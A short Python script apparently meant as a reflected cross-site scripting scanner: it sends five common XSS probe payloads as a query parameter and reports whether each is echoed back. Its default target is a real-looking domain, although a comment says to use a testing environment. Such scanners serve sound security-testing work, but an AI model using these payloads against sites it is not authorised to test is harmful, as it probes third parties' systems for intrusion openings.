import requests
from urllib.parse import urljoin

# List of common XSS payloads
xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg/onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<a href="javascript:alert(\'XSS\')">Click me</a>'
]

# Function to test a URL for XSS vulnerabilities
def test_xss(url):
    for payload in xss_payloads:
        # Send the payload to the URL
        response = requests.get(url, params={'input': payload})
        
        # Check if the payload is reflected in the response (indicating a vulnerability)
        if payload in response.text:
            print(f"[+] XSS vulnerability found with payload: {payload}")
        else:
            print(f"[-] No XSS vulnerability found with payload: {payload}")

# Example target URL (replace with actual target URL in your testing environment)
url = 'http://vbithyd.com/search'

test_xss(url)
